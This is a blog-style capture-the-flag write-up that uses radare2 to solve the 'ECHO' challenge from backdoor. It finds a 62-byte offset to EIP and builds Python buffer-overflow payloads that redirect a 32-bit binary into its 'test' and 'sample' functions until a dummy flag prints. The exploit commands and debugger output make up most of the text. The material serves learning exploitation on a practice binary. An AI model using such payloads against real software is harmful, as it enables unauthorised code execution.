---
layout: post
section-type: post
title: Solving Echo problem from backdoor using Radare2
category: buffer_overflow
tags: [ 'buffer_overflow', 'stack_overflow', 'radare2', 'protostar', 'write_up', 'ctf' ]
---
# Solving Echo problem from backdoor using Radare2

[Problem link](https://backdoor.sdslabs.co/challenges/ECHO)

{% highlight shell-session %}
S ragg2 -P 100 -r > payload.txt
S r2 -d echo -e dbg.profile=r2profile.rr2
Process with PID 6181 started...
= attach 6181 6181
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
 -- Enhance your graphs by increasing the size of the block and graph.depth eval variable.
[0xb7fdba30]> dc
ECHO: AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41415641 code=1 ret=0
[0x41415641]> wopO eip
62
[0x41415641]> iE
[Exports]
vaddr=0x0804a038 paddr=0x00001038 ord=052 fwd=NONE sz=4 bind=GLOBAL type=OBJECT name=stderr
vaddr=0x08048617 paddr=0x00000617 ord=070 fwd=NONE sz=36 bind=GLOBAL type=FUNC name=main
vaddr=0x0804856b paddr=0x0000056b ord=071 fwd=NONE sz=109 bind=GLOBAL type=FUNC name=sample
vaddr=0x080485d8 paddr=0x000005d8 ord=077 fwd=NONE sz=63 bind=GLOBAL type=FUNC name=test

18 exports

{% endhighlight %}

Now let's rewrite our payload and try to make the run flow go to the test function

{% highlight shell-session %}
S python -c 'print "A"*62 + "\xd8\x85\x04\x08"' > payload.txt
S ragg2 -P 100 -r >> payload.txt
S r2 -d echo -e dbg.profile=r2profile.rr2
Process with PID 15800 started...
= attach 15800 15800
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
[0xb7fdba30]> dc
ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA؅
ECHO: AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41415641 code=1 ret=0
[0x41415641]> wopO eip
62
{% endhighlight %}

We found that we need another jump after 62 bits which is the same offset as the first time, So we will inject sample fuction address after the test function '0x0804856b'

{% highlight shell-session %}
S python -c 'print "A" * 62 + "\xd8\x85\x04\x08" + "\x6b\x85\x04\x08"' > payload.txt
S r2 -d echo -e dbg.profile=r2profile.rr2
Process with PID 25897 started...
= attach 25897 25897
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
[0xb7fdba30]> dc
ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA؅k�
ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAk�
dummy_flag
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0xffffffffbffff600 code=2 ret=0
[0xbffff600]>
{% endhighlight %}

Can you see the `dummy_flag`? :D Wohoo WE DID IT!!!
